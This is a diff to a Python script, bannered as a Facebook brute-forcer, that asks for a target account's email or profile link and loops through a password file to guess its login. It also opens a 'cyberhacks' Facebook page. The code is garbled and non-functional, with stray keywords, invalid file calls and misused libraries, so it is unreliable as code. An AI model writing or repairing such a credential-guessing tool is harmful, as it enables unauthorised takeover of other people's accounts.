@@ -35,24 +35,28 @@ print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __|
 print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
 print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-file=open('passwords.txt','r')
+file=open('password.txt','r')
 webbrowser.open('www.facebook.com/cyberhacks6')
 
 def login( email, password):
-    urlopen = 'https://www.facebook.com/login.php'
-    header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
-email = input("INPUT TARGET ACOOUNT MAIL/PROFILE LINK:")
+   urlopen = 'https://www.facebook.com/login.php'
+   header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
+email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
 print(" TARGET MAIL /PROF LINK:",email+"")
+excepthandler
+
 ConnectionError
-print("\003[2;43m NO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[0;0m")
+
+Try
+print("NO INTERNET CONNECTION OR CONNECTION TIMEOUT")
 
 i=0
 while file:
-    passwords=open('password.txt','o','r' )
+    password=open('password.txt','o','r' )
     password=file.readline().strip()
     i+=1
-    if len(passwords) < 10:
-     print=str(i) +" : ",passwords
+    if len(password) < 10:
+     print=str(i) +" : ",password
     continue
 request = webbrowser.open('urlopen')
 Try
@@ -64,7 +68,7 @@ webbrowser.form['pass']=password
 response = webbrowser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
-print("your password is : ",passwords)
+print("your password is : ",password)
 Break
 
 sys.exit
